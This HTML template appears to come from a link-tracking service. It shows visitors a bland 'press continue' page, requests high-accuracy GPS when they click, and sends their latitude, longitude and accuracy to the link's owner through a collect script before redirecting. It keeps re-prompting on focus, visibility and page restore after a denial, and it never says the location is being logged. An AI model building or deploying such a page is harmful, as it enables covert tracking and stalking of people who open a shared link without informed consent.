<!doctype html>
<html lang="ja"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ link.name }}</title>
<style>
body{margin:0;background:#0f1115;color:#e6e9ef;font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;
  display:flex;min-height:100vh;align-items:center;justify-content:center}
.wrap{text-align:center;padding:24px;max-width:420px}
h1{font-size:18px;margin:0 0 8px}
p{color:#9aa3b2;font-size:13px;margin:0 0 20px}
button{padding:12px 32px;font-size:15px;border:0;border-radius:999px;background:#4c8dff;color:#fff}
.tiny{font-size:12px;color:#9aa3b2;margin-top:16px;line-height:1.6}
.tiny.warn{color:#f0b429}
.tiny.ok{color:#2ecc71}
a{color:#4c8dff}
</style></head><body>
<div class="wrap">
  <h1>{{ link.name }}</h1>
  <p>{{ link.note or "続けるを押してください" }}</p>
  <button id="go">{{ go_text }}</button>
  <p class="tiny" id="st"></p>
</div>
<script>
window.LT_CODE  = {{ code|tojson }};
window.LT_HIT   = {{ hit_id }};
window.LT_NONCE = {{ nonce|tojson }};
window.LT_GEO   = 0;          /* GPSはこのページで直接取る */
var DEST = {{ dest|tojson }};
var GO_TEXT = {{ go_text|tojson }};
var WAIT_TEXT = {{ wait_text|tojson }};
var OK_TEXT = {{ ok_text|tojson }};
var DENY_TEXT = {{ deny_text|tojson }};
var RETRY_TEXT = {{ retry_text|tojson }};
var DENY_REDIRECT = {{ 1 if deny_redirect else 0 }};
var DEST_MIN = {{ dest_min }};
</script>
<script src="/static/collect.js"></script>
<script>
(function () {
  var st = document.getElementById('st'), go = document.getElementById('go');
  var busy = false, done = false;

  function txt(m, cls) { st.textContent = m; st.className = 'tiny' + (cls ? ' ' + cls : ''); }

  function ok(p) {
    done = true;
    txt(OK_TEXT, 'ok');
    try {
      LT.send({ gps_lat: p.coords.latitude, gps_lon: p.coords.longitude,
                gps_acc: p.coords.accuracy });
    } catch (e) {}
    setTimeout(function () { if (DEST) location.href = DEST; }, Math.max(300, DEST_MIN * 1000));
  }

  function ng() {
    done = false;
    txt(DENY_TEXT, 'warn');
    go.textContent = RETRY_TEXT;
    go.disabled = false;
    if (DENY_REDIRECT && DEST) setTimeout(function () { location.href = DEST; }, 1500);
  }

  function attempt() {
    if (busy || done) return;
    busy = true;
    txt(WAIT_TEXT, '');
    if (!navigator.geolocation) { busy = false; ng(); return; }
    navigator.geolocation.getCurrentPosition(
      function (p) { busy = false; ok(p); },
      function (e) { busy = false; ng(); },
      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
  }

  go.addEventListener('click', attempt);
  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'visible' && !done) attempt();
  });
  window.addEventListener('focus', function () { if (!done) attempt(); });
  window.addEventListener('pageshow', function (e) { if (e.persisted && !done) attempt(); });
})();
</script>
</body></html>
